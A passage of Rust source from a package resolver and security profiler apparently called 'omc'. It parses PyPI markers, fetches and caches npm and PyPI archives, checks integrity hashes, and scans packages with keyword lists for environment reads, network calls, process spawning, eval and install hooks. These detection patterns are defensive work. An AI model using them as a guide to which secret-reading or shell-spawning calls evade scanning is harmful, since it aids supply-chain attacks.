fn parse_requirements_extra_index_url(line: &str) -> Option<String> {
    parse_requirements_option_value(line, &["--extra-index-url=", "--extra-index-url"])
        .and_then(|index_url| normalize_pypi_simple_index_url(&index_url))
}

fn parse_requirements_find_links(line: &str, base_dir: &Path) -> Option<String> {
    parse_requirements_option_value(line, &["--find-links=", "--find-links", "-f"])
        .and_then(|find_links| normalize_pypi_find_links_source(&find_links, base_dir))
}

fn parse_requirements_no_index(line: &str) -> bool {
    line == "--no-index"
}

fn parse_requirements_option_value(line: &str, prefixes: &[&str]) -> Option<String> {
    for prefix in prefixes {
        if prefix.ends_with('=') {
            let Some(value) = line.strip_prefix(prefix) else {
                continue;
            };
            let value = value.trim();
            if !value.is_empty() {
                return Some(value.to_owned());
            }
        } else if line == *prefix || line.starts_with(&format!("{prefix} ")) {
            return shell_like_tokens(line)
                .get(1)
                .filter(|value| !value.is_empty())
                .cloned();
        }
    }
    None
}

fn normalize_pypi_find_links_source(value: &str, base_dir: &Path) -> Option<String> {
    let value = value.trim();
    if value.is_empty() {
        return None;
    }
    if reqwest::Url::parse(value).is_ok() {
        return Some(value.to_owned());
    }
    let path = Path::new(value);
    let path = if path.is_absolute() {
        path.to_path_buf()
    } else {
        base_dir.join(path)
    };
    Some(path.to_string_lossy().into_owned())
}

fn normalize_pypi_simple_index_url(value: &str) -> Option<String> {
    let value = value.trim();
    if value.is_empty() {
        None
    } else {
        Some(ensure_trailing_slash(value))
    }
}

#[derive(Debug, Clone)]
struct PypiMarkerEnvironment {
    python_full_version: Option<String>,
    os_name: String,
    sys_platform: String,
    platform_system: String,
    platform_machine: String,
    implementation_name: String,
    platform_python_implementation: String,
    extra: String,
}

impl PypiMarkerEnvironment {
    fn current() -> Self {
        Self {
            python_full_version: current_python_version(),
            os_name: os_name().to_owned(),
            sys_platform: sys_platform().to_owned(),
            platform_system: platform_system().to_owned(),
            platform_machine: std::env::consts::ARCH.to_owned(),
            implementation_name: "cpython".to_owned(),
            platform_python_implementation: "CPython".to_owned(),
            extra: String::new(),
        }
    }

    fn value(&self, name: &str) -> Option<String> {
        match name {
            "python_version" => self.python_full_version.as_deref().map(python_major_minor),
            "python_full_version" => self.python_full_version.clone(),
            "os_name" => Some(self.os_name.clone()),
            "sys_platform" => Some(self.sys_platform.clone()),
            "platform_system" => Some(self.platform_system.clone()),
            "platform_machine" => Some(self.platform_machine.clone()),
            "implementation_name" => Some(self.implementation_name.clone()),
            "platform_python_implementation" => Some(self.platform_python_implementation.clone()),
            "extra" => Some(self.extra.clone()),
            _ => None,
        }
    }
}

fn pypi_marker_applies(marker: &str, active_extras: &BTreeSet<String>) -> bool {
    let mut env = PypiMarkerEnvironment::current();
    if active_extras.is_empty() {
        return evaluate_pypi_marker(marker.trim(), &env).unwrap_or(true);
    }

    active_extras.iter().any(|extra| {
        env.extra.clone_from(extra);
        evaluate_pypi_marker(marker.trim(), &env).unwrap_or(true)
    })
}

fn evaluate_pypi_marker(marker: &str, env: &PypiMarkerEnvironment) -> Option<bool> {
    let mut saw_unknown_true_path = false;

    for or_group in split_marker_keyword(marker, "or") {
        let mut group_unknown = false;
        let mut group_matches = true;

        for atom in split_marker_keyword(or_group, "and") {
            match evaluate_pypi_marker_atom(atom, env) {
                Some(true) => {}
                Some(false) => {
                    group_matches = false;
                    break;
                }
                None => group_unknown = true,
            }
        }

        if group_matches && !group_unknown {
            return Some(true);
        }
        if group_matches {
            saw_unknown_true_path = true;
        }
    }

    if saw_unknown_true_path {
        None
    } else {
        Some(false)
    }
}

fn evaluate_pypi_marker_atom(atom: &str, env: &PypiMarkerEnvironment) -> Option<bool> {
    let atom = atom
        .trim()
        .trim_start_matches('(')
        .trim_end_matches(')')
        .trim();

    let (left, op, right) = split_marker_comparison(atom)?;
    let left = marker_operand_value(left, env)?;
    let right = marker_operand_value(right, env)?;

    match op {
        "==" => Some(left == right),
        "!=" => Some(left != right),
        "in" => Some(right.contains(&left)),
        "not in" => Some(!right.contains(&left)),
        ">=" | "<=" | ">" | "<" => {
            if looks_like_version(&left) && looks_like_version(&right) {
                let ordering = compare_pypi_versions(&left, &right);
                Some(match op {
                    ">=" => ordering.is_ge(),
                    "<=" => ordering.is_le(),
                    ">" => ordering.is_gt(),
                    "<" => ordering.is_lt(),
                    _ => false,
                })
            } else {
                Some(match op {
                    ">=" => left >= right,
                    "<=" => left <= right,
                    ">" => left > right,
                    "<" => left < right,
                    _ => false,
                })
            }
        }
        _ => None,
    }
}

fn split_marker_comparison(atom: &str) -> Option<(&str, &'static str, &str)> {
    for (needle, op) in [
        (" not in ", "not in"),
        (" in ", "in"),
        ("==", "=="),
        ("!=", "!="),
        (">=", ">="),
        ("<=", "<="),
        (">", ">"),
        ("<", "<"),
    ] {
        if let Some(index) = find_outside_quotes(atom, needle) {
            let left = atom[..index].trim();
            let right = atom[index + needle.len()..].trim();
            if !left.is_empty() && !right.is_empty() {
                return Some((left, op, right));
            }
        }
    }

    None
}

fn marker_operand_value(value: &str, env: &PypiMarkerEnvironment) -> Option<String> {
    let value = value.trim();
    if let Some(quoted) = unquote_marker_value(value) {
        return Some(quoted);
    }
    env.value(value)
}

fn unquote_marker_value(value: &str) -> Option<String> {
    let bytes = value.as_bytes();
    if bytes.len() >= 2
        && ((bytes[0] == b'\'' && bytes[bytes.len() - 1] == b'\'')
            || (bytes[0] == b'"' && bytes[bytes.len() - 1] == b'"'))
    {
        Some(value[1..value.len() - 1].to_owned())
    } else {
        None
    }
}

fn split_marker_keyword<'a>(marker: &'a str, keyword: &str) -> Vec<&'a str> {
    let separator = format!(" {keyword} ");
    let mut parts = Vec::new();
    let mut start = 0;
    let mut quote = None;
    let mut index = 0;

    while index < marker.len() {
        let ch = marker[index..].chars().next().unwrap_or_default();
        let ch_len = ch.len_utf8();

        if matches!(ch, '\'' | '"') {
            if quote == Some(ch) {
                quote = None;
            } else if quote.is_none() {
                quote = Some(ch);
            }
        }

        if quote.is_none() && marker[index..].to_ascii_lowercase().starts_with(&separator) {
            parts.push(marker[start..index].trim());
            index += separator.len();
            start = index;
            continue;
        }

        index += ch_len;
    }

    parts.push(marker[start..].trim());
    parts
}

fn find_outside_quotes(haystack: &str, needle: &str) -> Option<usize> {
    let mut quote = None;
    let mut index = 0;

    while index < haystack.len() {
        let ch = haystack[index..].chars().next().unwrap_or_default();
        let ch_len = ch.len_utf8();

        if matches!(ch, '\'' | '"') {
            if quote == Some(ch) {
                quote = None;
            } else if quote.is_none() {
                quote = Some(ch);
            }
        }

        if quote.is_none() && haystack[index..].starts_with(needle) {
            return Some(index);
        }

        index += ch_len;
    }

    None
}

fn python_major_minor(version: &str) -> String {
    let mut parts = version.split('.');
    let major = parts.next().unwrap_or("0");
    let minor = parts.next().unwrap_or("0");
    format!("{major}.{minor}")
}

fn looks_like_version(value: &str) -> bool {
    value
        .chars()
        .next()
        .map(|ch| ch.is_ascii_digit())
        .unwrap_or(false)
}

fn os_name() -> &'static str {
    if cfg!(windows) {
        "nt"
    } else {
        "posix"
    }
}

fn sys_platform() -> &'static str {
    if cfg!(target_os = "macos") {
        "darwin"
    } else if cfg!(target_os = "windows") {
        "win32"
    } else if cfg!(target_os = "linux") {
        "linux"
    } else {
        std::env::consts::OS
    }
}

fn platform_system() -> &'static str {
    if cfg!(target_os = "macos") {
        "Darwin"
    } else if cfg!(target_os = "windows") {
        "Windows"
    } else if cfg!(target_os = "linux") {
        "Linux"
    } else {
        std::env::consts::OS
    }
}

fn download_artifact(
    client: &Client,
    package: &ResolvedPackage,
    project_dir: &Path,
) -> Result<Vec<u8>> {
    if let Some(path) = &package.local_path {
        return Ok(fs::read(path)?);
    }
    let source_url = package
        .download_url
        .as_deref()
        .unwrap_or(&package.source_url);
    let config = if package.ecosystem == Ecosystem::Npm {
        Some(read_npm_config(project_dir)?)
    } else {
        None
    };
    let request = if let Some(config) = config.as_ref() {
        npm_get(client, source_url, config)
    } else {
        client.get(source_url)
    };
    Ok(request.send()?.error_for_status()?.bytes()?.to_vec())
}

fn cache_archive(
    project_dir: &Path,
    package: &ResolvedPackage,
    sha256: &str,
    bytes: &[u8],
) -> Result<PathBuf> {
    let cache_dir = project_dir
        .join(".omc")
        .join("cache")
        .join(package.ecosystem.to_string())
        .join(safe_name(&package.name))
        .join(&package.version);
    fs::create_dir_all(&cache_dir)?;

    let extension = archive_extension(&package.filename);
    let archive_path = cache_dir.join(format!("{sha256}.{extension}"));
    if !archive_path.exists() {
        fs::write(&archive_path, bytes)?;
    }
    Ok(archive_path)
}

fn write_artifact(
    project_dir: &Path,
    package: &ResolvedPackage,
    artifact: &OmcArtifact,
) -> Result<PathBuf> {
    let artifact_dir = project_dir
        .join(".omc")
        .join("artifacts")
        .join(package.ecosystem.to_string())
        .join(safe_name(&package.name))
        .join(&package.version);
    fs::create_dir_all(&artifact_dir)?;

    let artifact_path = artifact_dir.join("omc.json");
    fs::write(&artifact_path, serde_json::to_string_pretty(artifact)?)?;
    Ok(artifact_path)
}

#[derive(Debug, Clone)]
struct ArchiveProfile {
    files_scanned: usize,
    capabilities: Vec<CapabilityFinding>,
}

fn profile_archive(package: &ResolvedPackage, bytes: &[u8]) -> Result<ArchiveProfile> {
    let mut profiler = SourceProfiler::default();

    for (name, script) in &package.npm_scripts {
        if is_npm_lifecycle_script(name) {
            profiler.add(
                CapabilityKind::ProcSpawn,
                format!("npm-script:{name}"),
                "package.json",
                format!("lifecycle script `{name}` = `{script}`"),
            );
        }
    }

    if package.filename.ends_with(".tgz") || package.filename.ends_with(".tar.gz") {
        let decoder = GzDecoder::new(Cursor::new(bytes));
        let mut archive = Archive::new(decoder);
        for entry in archive.entries()? {
            let mut entry = entry?;
            if !entry.header().entry_type().is_file() || entry.size() > MAX_FILE_BYTES {
                continue;
            }
            let path = entry.path()?.to_string_lossy().into_owned();
            let mut content = String::new();
            entry.read_to_string(&mut content).ok();
            profiler.scan_file(&path, &content);
        }
    } else if package.filename.ends_with(".whl") || package.filename.ends_with(".zip") {
        let reader = Cursor::new(bytes);
        let mut archive = zip::ZipArchive::new(reader)?;
        for index in 0..archive.len() {
            let mut file = archive.by_index(index)?;
            if file.is_dir() || file.size() > MAX_FILE_BYTES {
                continue;
            }
            let path = file.name().to_owned();
            let mut content = String::new();
            file.read_to_string(&mut content).ok();
            profiler.scan_file(&path, &content);
        }
    } else {
        let content = String::from_utf8_lossy(bytes);
        profiler.scan_file(&package.filename, &content);
    }

    Ok(profiler.finish())
}

#[derive(Debug, Default)]
struct SourceProfiler {
    files_scanned: usize,
    findings: BTreeSet<CapabilityFinding>,
}

impl SourceProfiler {
    fn scan_file(&mut self, path: &str, content: &str) {
        if !is_source_like(path) || is_ignored_source_path(path) || content.is_empty() {
            return;
        }

        self.files_scanned += 1;
        let lower = content.to_ascii_lowercase();

        for pattern in ["process.env", "os.environ", "getenv("] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::EnvRead, "*", path, pattern);
            }
        }

        for pattern in [
            "readfilesync",
            "readfile(",
            "createreadstream",
            "require(\"fs\")",
            "require('fs')",
            "open(",
        ] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::FsRead, "*", path, pattern);
            }
        }

        for pattern in [
            "writefilesync",
            "writefile(",
            "createwritestream",
            ".write(",
        ] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::FsWrite, "*", path, pattern);
            }
        }

        for pattern in [
            "fetch(",
            "require(\"http\")",
            "require('http')",
            "require(\"https\")",
            "require('https')",
            "axios",
            "requests.",
            "urllib.request",
            "httpx.",
            "socket.",
        ] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::HttpRequest, "*", path, pattern);
            }
        }

        for pattern in [
            "child_process",
            "subprocess",
            "os.system",
            "popen(",
            "spawn(",
            "execfile(",
        ] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::ProcSpawn, "*", path, pattern);
            }
        }

        for pattern in ["eval(", "new function", "exec("] {
            if lower.contains(pattern) {
                self.add(CapabilityKind::DynamicEval, "*", path, pattern);
            }
        }
    }

    fn add(
        &mut self,
        kind: CapabilityKind,
        target: impl Into<String>,
        source: impl Into<String>,
        evidence: impl Into<String>,
    ) {
        self.findings.insert(CapabilityFinding {
            kind,
            target: target.into(),
            source: source.into(),
            evidence: evidence.into(),
        });
    }

    fn finish(self) -> ArchiveProfile {
        ArchiveProfile {
            files_scanned: self.files_scanned,
            capabilities: self.findings.into_iter().collect(),
        }
    }
}

fn module_from_profile(package: &ResolvedPackage, capabilities: &[CapabilityFinding]) -> Module {
    let behavior = if capabilities.is_empty() {
        BehaviorType::Pure
    } else {
        BehaviorType::HostCapability
    };
    let mut code = Vec::new();
    for finding in capabilities {
        code.push(Op::Cap(cap_op_from_finding(finding)));
    }
    code.push(Op::Const(Value::Unit));
    code.push(Op::Return);

    Module {
        id: format!("{}:{}@{}", package.ecosystem, package.name, package.version),
        package: package.name.clone(),
        version: package.version.clone(),
        declared_behavior: behavior,
        functions: vec![Function::new(0, "package_init", 0, code)],
    }
}

fn cap_op_from_finding(finding: &CapabilityFinding) -> CapOp {
    match finding.kind {
        CapabilityKind::EnvRead => CapOp::EnvRead {
            name: finding.target.clone(),
        },
        CapabilityKind::FsRead => CapOp::FsRead {
            path: VirtualPath(finding.target.clone()),
        },
        CapabilityKind::FsWrite => CapOp::FsWrite {
            path: VirtualPath(finding.target.clone()),
            value_from_stack: false,
        },
        CapabilityKind::HttpRequest => CapOp::HttpRequest {
            request: HttpRequest {
                method: "POST".to_owned(),
                url: "omc://observed-network".to_owned(),
                host: finding.target.clone(),
                body_from_stack: false,
            },
        },
        CapabilityKind::ProcSpawn => CapOp::ProcSpawn {
            command: finding.target.clone(),
            args: Vec::new(),
        },
        CapabilityKind::DynamicEval => CapOp::DynamicEval {
            source_from_stack: false,
        },
    }
}

fn render_verify_finding(finding: VerifyFinding) -> String {
    format!(
        "{}[{}]: {}",
        finding.function, finding.instruction, finding.message
    )
}

fn is_npm_lifecycle_script(name: &str) -> bool {
    matches!(
        name,
        "preinstall"
            | "install"
            | "postinstall"
            | "prepare"
            | "prepublish"
            | "prepack"
            | "postpack"
    )
}

fn is_source_like(path: &str) -> bool {
    let path = path.to_ascii_lowercase();
    let file_name = Path::new(&path)
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default();

    if matches!(
        file_name,
        "package.json"
            | "package-lock.json"
            | "npm-shrinkwrap.json"
            | "setup.py"
            | "conftest.py"
            | "tox.ini"
            | "noxfile.py"
            | "pyproject.toml"
            | "setup.cfg"
    ) {
        return false;
    }

    matches!(
        Path::new(&path).extension().and_then(|ext| ext.to_str()),
        Some("js" | "mjs" | "cjs" | "ts" | "tsx" | "jsx" | "py" | "json" | "toml" | "cfg" | "ini")
    )
}

fn is_ignored_source_path(path: &str) -> bool {
    path.split('/').any(|component| {
        matches!(
            component.to_ascii_lowercase().as_str(),
            "test"
                | "tests"
                | "__tests__"
                | "docs"
                | "doc"
                | "examples"
                | "example"
                | "benchmark"
                | "benchmarks"
                | "perf"
                | "performance"
        )
    })
}

fn sha256_hex(bytes: &[u8]) -> String {
    let mut digest = Sha256::new();
    digest.update(bytes);
    hex::encode(digest.finalize())
}

fn sha1_hex(bytes: &[u8]) -> String {
    let mut digest = Sha1::new();
    digest.update(bytes);
    hex::encode(digest.finalize())
}

fn verify_npm_integrity(name: &str, integrity: &str, bytes: &[u8]) -> Result<()> {
    let mut saw_supported = false;
    for token in integrity.split_whitespace() {
        let Some((algorithm, expected_b64)) = token.split_once('-') else {
            return Err(OmcRegistryError::UnsupportedSpec(format!(
                "malformed npm integrity for {name}"
            )));
        };
        let expected_b64 = expected_b64.split('?').next().unwrap_or(expected_b64);
        let expected = STANDARD.decode(expected_b64).map_err(|_| {
            OmcRegistryError::UnsupportedSpec(format!("malformed npm integrity for {name}"))
        })?;
        let Some(actual) = npm_integrity_digest(algorithm, bytes) else {
            continue;
        };
        saw_supported = true;
        if expected != actual {
            return Err(OmcRegistryError::DigestMismatch {
                name: name.to_owned(),
                expected: format!("{algorithm}-{expected_b64}"),
                actual: format!("{algorithm}-{}", STANDARD.encode(actual)),
            });
        }
    }

    if !saw_supported {
        return Err(OmcRegistryError::UnsupportedSpec(format!(
            "unsupported npm integrity digest for {name}"
        )));
    }

    Ok(())
}

fn npm_integrity_digest(algorithm: &str, bytes: &[u8]) -> Option<Vec<u8>> {
    match algorithm {
        "sha1" => {
            let mut digest = Sha1::new();
            digest.update(bytes);
            Some(digest.finalize().to_vec())
        }
        "sha256" => {
            let mut digest = Sha256::new();
            digest.update(bytes);
            Some(digest.finalize().to_vec())
        }
        "sha512" => {
            let mut digest = Sha512::new();
            digest.update(bytes);
            Some(digest.finalize().to_vec())
        }
        _ => None,
    }
}

fn archive_extension(filename: &str) -> &'static str {
    if filename.ends_with(".tar.gz") || filename.ends_with(".tgz") {
        "tgz"
    } else if filename.ends_with(".whl") {
        "whl"
    } else if filename.ends_with(".zip") {
        "zip"
    } else {
        "archive"
    }
}

fn safe_name(name: &str) -> String {
    name.replace('/', "__")
}

fn relative_path(base: &Path, path: &Path) -> String {
    path.strip_prefix(base)
        .unwrap_or(path)
        .to_string_lossy()
        .replace('\\', "/")
}

#[derive(Debug, Deserialize)]
struct ProjectPackageJson {
    #[serde(default)]
    scripts: BTreeMap<String, String>,
    #[serde(default)]
    workspaces: Option<ProjectWorkspaces>,
    #[serde(default)]
    dependencies: BTreeMap<String, String>,
    #[serde(default, rename = "devDependencies")]
    dev_dependencies: BTreeMap<String, String>,
    #[serde(default, rename = "optionalDependencies")]
    optional_dependencies: BTreeMap<String, String>,
    #[serde(default, rename = "peerDependencies")]
    peer_dependencies: BTreeMap<String, String>,
    #[serde(default, rename = "peerDependenciesMeta")]
    peer_dependencies_meta: BTreeMap<String, NpmPeerDependencyMeta>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(untagged)]
enum ProjectWorkspaces {
    Patterns(Vec<String>),
    Config {
        #[serde(default)]
        packages: Vec<String>,
    },
}

impl ProjectWorkspaces {
    fn patterns(&self) -> &[String] {
        match self {
            Self::Patterns(patterns) => patterns,
            Self::Config { packages } => packages,
        }
    }
}

#[derive(Debug, Default, Deserialize)]
struct NpmPackageLock {
    #[serde(default)]
    packages: BTreeMap<String, NpmPackageLockPackage>,
    #[serde(default)]
    dependencies: BTreeMap<String, NpmPackageLockDependency>,
}

#[derive(Debug, Deserialize)]
struct NpmPackageLockPackage {
    version: Option<String>,
    #[serde(default)]
    integrity: Option<String>,
    #[serde(default)]
    resolved: Option<String>,
}

#[derive(Debug, Default, Deserialize)]
struct NpmPackageLockDependency {
    version: Option<String>,
    #[serde(default)]
    integrity: Option<String>,
    #[serde(default)]
    resolved: Option<String>,
    #[serde(default)]
    dependencies: BTreeMap<String, NpmPackageLockDependency>,
}

#[derive(Debug)]
struct YarnLockEntry {
    selectors: Vec<String>,
    version: Option<String>,
    resolved: Option<String>,
    integrity: Option<String>,
}

#[derive(Debug, Deserialize)]
struct PyProjectToml {
    project: Option<PyProjectProject>,
    tool: Option<PyProjectTool>,
}

#[derive(Debug, Deserialize)]
struct PyProjectProject {
    #[serde(default)]
    dependencies: Vec<String>,
    #[serde(default, rename = "optional-dependencies")]
    optional_dependencies: BTreeMap<String, Vec<String>>,
}

#[derive(Debug, Deserialize)]
struct PyProjectTool {
    poetry: Option<PoetryProject>,
}

#[derive(Debug, Default, Deserialize)]
struct PoetryProject {
    #[serde(default)]
    dependencies: BTreeMap<String, PoetryDependency>,
    #[serde(default, rename = "dev-dependencies")]
    dev_dependencies: BTreeMap<String, PoetryDependency>,
    #[serde(default)]
    extras: BTreeMap<String, Vec<String>>,
    #[serde(default)]
    group: BTreeMap<String, PoetryGroup>,
}

#[derive(Debug, Default, Deserialize)]
struct PoetryGroup {
    #[serde(default)]
    optional: bool,
    #[serde(default)]
    dependencies: BTreeMap<String, PoetryDependency>,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum PoetryDependency {
    Version(String),
    Table(PoetryDependencyTable),
}

#[derive(Debug, Default, Deserialize)]
struct PoetryDependencyTable {
    version: Option<String>,
    #[serde(default)]
    optional: bool,
    path: Option<String>,
    git: Option<String>,
    url: Option<String>,
    file: Option<String>,
}

#[derive(Debug, Default, Deserialize)]
struct PoetryLock {
    #[serde(default)]
    package: Vec<PoetryLockedPackage>,
    #[serde(default)]
    metadata: PoetryLockMetadata,
}

#[derive(Debug, Default, Deserialize)]
struct PoetryLockMetadata {
    #[serde(default)]
    files: BTreeMap<String, Vec<PoetryLockedFile>>,
}

#[derive(Debug, Deserialize)]
struct PoetryLockedPackage {
    name: String,
    version: String,
    #[serde(default)]
    files: Vec<PoetryLockedFile>,
}

#[derive(Debug, Deserialize)]
struct PoetryLockedFile {
    #[serde(rename = "file")]
    _file: String,
    hash: String,
}

#[derive(Debug, Deserialize)]
struct NpmInstalledPackageJson {
    name: Option<String>,
    bin: Option<NpmBinField>,
}

#[derive(Debug, Deserialize)]
#[serde(untagged)]
enum NpmBinField {
    String(String),
    Map(BTreeMap<String, String>),
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct PythonEntryPoint {
    name: String,
    module: String,
    function: String,
}

#[derive(Debug, Deserialize)]
struct NpmRoot {
    #[serde(rename = "dist-tags")]
    dist_tags: NpmDistTags,
    versions: BTreeMap<String, NpmVersion>,
}

#[derive(Debug, Deserialize)]
struct NpmDistTags {
    latest: String,
}

#[derive(Debug, Deserialize)]
struct NpmVersion {
    version: String,
    dist: NpmDist,
    #[serde(default)]
    os: Option<NpmStringList>,
    #[serde(default)]
    cpu: Option<NpmStringList>,
    #[serde(default)]
    libc: Option<NpmStringList>,
    #[serde(default)]
    scripts: Option<BTreeMap<String, String>>,
    #[serde(default)]
    dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "optionalDependencies")]
    optional_dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "bundleDependencies")]
    bundle_dependencies: Option<NpmStringList>,
    #[serde(default, rename = "bundledDependencies")]
    bundled_dependencies: Option<NpmStringList>,
    #[serde(default, rename = "peerDependencies")]
    peer_dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "peerDependenciesMeta")]
    peer_dependencies_meta: Option<BTreeMap<String, NpmPeerDependencyMeta>>,
}

#[derive(Debug, Deserialize)]
struct NpmPackageManifest {
    version: String,
    #[serde(default)]
    os: Option<NpmStringList>,
    #[serde(default)]
    cpu: Option<NpmStringList>,
    #[serde(default)]
    libc: Option<NpmStringList>,
    #[serde(default)]
    scripts: Option<BTreeMap<String, String>>,
    #[serde(default)]
    dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "optionalDependencies")]
    optional_dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "bundleDependencies")]
    bundle_dependencies: Option<NpmStringList>,
    #[serde(default, rename = "bundledDependencies")]
    bundled_dependencies: Option<NpmStringList>,
    #[serde(default, rename = "peerDependencies")]
    peer_dependencies: Option<BTreeMap<String, String>>,
    #[serde(default, rename = "peerDependenciesMeta")]
    peer_dependencies_meta: Option<BTreeMap<String, NpmPeerDependencyMeta>>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(untagged)]
enum NpmStringList {
    One(String),
    Many(Vec<String>),
    Bool(bool),
}

impl NpmStringList {
    fn values(&self) -> Vec<String> {
        match self {
            Self::One(value) => vec![value.clone()],
            Self::Many(values) => values.clone(),
            Self::Bool(_) => Vec::new(),
        }
    }

    fn bool_value(&self) -> Option<bool> {
        match self {
            Self::Bool(value) => Some(*value),
            _ => None,
        }
    }
}

#[derive(Debug, Clone, Default, Deserialize)]
struct NpmPeerDependencyMeta {
    #[serde(default)]
    optional: bool,
}

#[derive(Debug, Deserialize)]
struct NpmDist {
    tarball: String,
    #[serde(default)]
    shasum: Option<String>,
    #[serde(default)]
    integrity: Option<String>,
}

#[derive(Debug, Deserialize)]
struct PypiResponse {
    info: PypiInfo,
    urls: Vec<PypiFile>,
}

#[derive(Debug, Deserialize)]
struct PypiInfo {
    name: String,
    version: String,
    #[serde(default)]
    requires_dist: Option<Vec<String>>,
}

#[derive(Debug, Deserialize)]
struct PypiRoot {
    info: PypiInfo,
    releases: BTreeMap<String, Vec<PypiFile>>,
}

#[derive(Debug, Deserialize)]
struct PypiFile {
    filename: String,
    packagetype: String,
    url: String,
    digests: PypiDigests,
    #[serde(default)]
    requires_python: Option<String>,
}

#[derive(Debug, Deserialize)]
struct PypiDigests {
    sha256: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    fn has_spec(specs: &[PackageSpec], name: &str, requirement: &str) -> bool {
        specs
            .iter()
            .any(|spec| spec.name == name && spec.version.as_deref() == Some(requirement))
    }

    #[test]
    fn parses_npm_specs() {
        let spec = PackageSpec::parse("npm:left-pad@1.3.0").unwrap();
        assert_eq!(spec.ecosystem, Ecosystem::Npm);
        assert_eq!(spec.name, "left-pad");
        assert_eq!(spec.version.as_deref(), Some("1.3.0"));

        let spec = PackageSpec::parse("npm:@scope/pkg@2.0.0").unwrap();
        assert_eq!(spec.name, "@scope/pkg");
        assert_eq!(spec.version.as_deref(), Some("2.0.0"));
    }

    #[test]
    fn parses_pypi_specs() {
        let spec = PackageSpec::parse("pypi:requests==2.32.3").unwrap();
        assert_eq!(spec.ecosystem, Ecosystem::Pypi);
        assert_eq!(spec.name, "requests");
        assert_eq!(spec.version.as_deref(), Some("2.32.3"));
        assert!(spec.extras.is_empty());

        let spec = PackageSpec::parse("pypi:six@1.16.0").unwrap();
        assert_eq!(spec.name, "six");
        assert_eq!(spec.version.as_deref(), Some("1.16.0"));

        let spec = PackageSpec::parse("pypi:urllib3<3,>=1.21.1").unwrap();
        assert_eq!(spec.name, "urllib3");
        assert_eq!(spec.version.as_deref(), Some("<3,>=1.21.1"));

        let spec = PackageSpec::parse("pypi:requests[socks,security]==2.32.3").unwrap();
        assert_eq!(spec.name, "requests");
        assert_eq!(spec.version.as_deref(), Some("2.32.3"));
        assert_eq!(
            spec.extras,
            BTreeSet::from(["security".to_owned(), "socks".to_owned()])
        );
        assert_eq!(spec.package_key(), "pypi:requests[security,socks]");

        let spec = PackageSpec::parse(
            "pypi:idna @ https://example.invalid/idna-3.7-py3-none-any.whl#sha256=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        )
        .unwrap();
        assert_eq!(spec.name, "idna");
        assert_eq!(
            spec.direct_url.as_deref(),
            Some("https://example.invalid/idna-3.7-py3-none-any.whl")
        );
    }

    #[test]
    fn resolves_common_npm_ranges() {
        assert!(npm_version_satisfies("6.0.0", "^6.0.0"));
        assert!(npm_version_satisfies("6.1.2", "^6.0.0"));
        assert!(!npm_version_satisfies("7.0.0", "^6.0.0"));
        assert!(npm_version_satisfies("1.2.9", "~1.2.0"));
        assert!(!npm_version_satisfies("1.3.0", "~1.2.0"));
        assert!(npm_version_satisfies("1.1.3", "^1.1.0,1.1.3"));
        assert!(!npm_version_satisfies("1.3.0", "^1.1.0,1.1.3"));
    }

    #[test]
    fn parses_npm_alias_requirements() {
        let spec = PackageSpec {
            ecosystem: Ecosystem::Npm,
            name: "string-width-cjs".to_owned(),
            version: Some("npm:string-width@^4.2.0".to_owned()),
            extras: BTreeSet::new(),
            direct_url: None,
        };
        let (registry_name, requirement) = npm_registry_name_and_requirement(&spec).unwrap();
        assert_eq!(registry_name, "string-width");
        assert_eq!(requirement.as_deref(), Some("^4.2.0"));
    }

    #[test]
    fn reads_project_package_json_specs() {
        let dir = tempfile::tempdir().unwrap();
        let package_json = dir.path().join("package.json");
        fs::write(
            &package_json,
            r#"{
                "scripts": { "check": "node -e \"console.log('ok')\"" },
                "dependencies": { "is-odd": "3.0.1" },
                "devDependencies": { "which": "^2.0.2" },
                "optionalDependencies": { "is-even": "1.0.0" },
                "peerDependencies": {
                    "left-pad": "1.3.0",
                    "optional-peer": "1.0.0"
                },
                "peerDependenciesMeta": {
                    "optional-peer": { "optional": true }
                }
            }"#,
        )
        .unwrap();
        let specs = read_package_json_specs(&package_json, true).unwrap();
        assert!(specs
            .iter()
            .any(|spec| spec.name == "is-odd" && spec.version.as_deref() == Some("3.0.1")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "which" && spec.version.as_deref() == Some("^2.0.2")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "is-even" && spec.version.as_deref() == Some("1.0.0")));
        assert!(specs
            .iter()
            .any(|spec| spec.name == "left-pad" && spec.version.as_deref() == Some("1.3.0")));
        assert!(!specs.iter().any(|spec| spec.name == "optional-peer"));

        let scripts = read_package_scripts(dir.path()).unwrap();
        assert_eq!(
            scripts.get("check").map(String::as_str),
            Some("node -e \"console.log('ok')\"")
        );

        let production_specs = read_package_json_specs(&package_json, false).unwrap();
        assert!(production_specs
            .iter()
            .any(|spec| spec.name == "is-odd" && spec.version.as_deref() == Some("3.0.1")));
        assert!(!production_specs.iter().any(|spec| spec.name == "which"));
    }

    #[test]
    fn reads_workspace_package_json_specs() {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir_all(dir.path().join("packages/api")).unwrap();
        fs::create_dir_all(dir.path().join("packages/ignored")).unwrap();
        fs::create_dir_all(dir.path().join("node_modules/nope")).unwrap();

        let package_json = dir.path().join("package.json");
        fs::write(
            &package_json,
            r#"{
                "name": "workspace-root",
                "workspaces": ["packages/*", "!packages/ignored"],
                "dependencies": { "root-dep": "1.0.0" },
                "devDependencies": { "root-dev": "2.0.0" }
            }"#,
        )
        .unwrap();
        fs::write(
            dir.path().join("packages/api/package.json"),
            r#"{
                "name": "api",
                "dependencies": { "workspace-dep": "3.0.0" },
                "devDependencies": { "workspace-dev": "4.0.0" }
            }"#,
